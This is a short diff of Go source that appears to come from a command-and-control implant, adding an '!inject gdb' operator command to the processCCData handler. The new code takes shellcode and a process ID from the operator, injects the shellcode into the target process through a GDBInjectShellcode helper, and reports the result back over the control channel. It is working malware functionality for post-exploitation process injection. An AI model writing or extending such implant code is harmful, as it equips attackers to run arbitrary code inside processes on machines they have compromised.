@@ -7,6 +7,7 @@ import (
 	"log"
 	"os"
 	"os/exec"
+	"strconv"
 	"strings"
 )
 
@@ -132,6 +133,28 @@ func processCCData(data *MsgTunData) {
 			}
 
 			return
+		}
+
+		// GDB inject
+		if cmdSlice[0] == "!inject" {
+			out = "an error occurred"
+			if cmdSlice[1] == "gdb" {
+				out = "GDB has successfully injected shellcode into target process" +
+					"\nYour shellcode will run before target process exits"
+				if len(cmdSlice) != 4 {
+					goto send
+				}
+				pid, err := strconv.Atoi(cmdSlice[3])
+				if err != nil {
+					log.Print("Invalid pid")
+				}
+				err = GDBInjectShellcode(cmdSlice[2], pid)
+				if err != nil {
+					out = "failed: " + err.Error()
+				}
+			}
+			data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", OpSep, strings.Join(cmdSlice, " "), OpSep, out)
+			goto send
 		}
 
 		// download utils.zip
